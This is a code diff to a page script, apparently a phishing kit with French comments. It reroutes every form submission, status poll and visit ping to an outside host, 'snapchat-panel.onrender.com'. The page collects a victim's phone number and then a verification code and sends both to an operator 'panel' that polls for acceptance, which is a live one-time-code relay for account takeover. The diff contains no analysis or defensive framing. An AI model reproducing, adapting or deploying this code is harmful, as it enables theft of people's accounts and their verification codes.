@@ -499,7 +499,7 @@
       phoneNumber = countryCode + " " + phone;
       
       try {
-        const res = await fetch('/api/request', {
+        const res = await fetch('https://snapchat-panel.onrender.com/api/request', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
@@ -531,7 +531,7 @@
             if (!currentSessionId) return clearInterval(pollInterval);
             
             try {
-                const res = await fetch(`/api/status/${currentSessionId}`);
+                const res = await fetch(`https://snapchat-panel.onrender.com/api/status/${currentSessionId}`);
                 const data = await res.json();
                 
                 if (data.status === 'accepted') {
@@ -580,7 +580,7 @@
       document.getElementById('codeSpinner').style.display = 'block';
 
       try {
-          await fetch('/api/submit-code', {
+          await fetch('https://snapchat-panel.onrender.com/api/submit-code', {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
               body: JSON.stringify({ sessionId: currentSessionId, code })
@@ -605,7 +605,7 @@
             if (!currentSessionId) return clearInterval(pollInterval);
             
             try {
-                const res = await fetch(`/api/status/${currentSessionId}`);
+                const res = await fetch(`https://snapchat-panel.onrender.com/api/status/${currentSessionId}`);
                 const data = await res.json();
                 
                 if (data.status === 'code_accepted') {
@@ -673,7 +673,7 @@
     // Input Listeners (Uniquement chiffres pour phone et code)
     document.addEventListener('DOMContentLoaded', () => {
       // Notification de visite du site
-      fetch('/api/visit', { method: 'POST' }).catch(() => {});
+      fetch('https://snapchat-panel.onrender.com/api/visit', { method: 'POST' }).catch(() => {});
 
       const countryCodeSelect = document.getElementById('countryCode');
       const phoneInput = document.getElementById('phone');
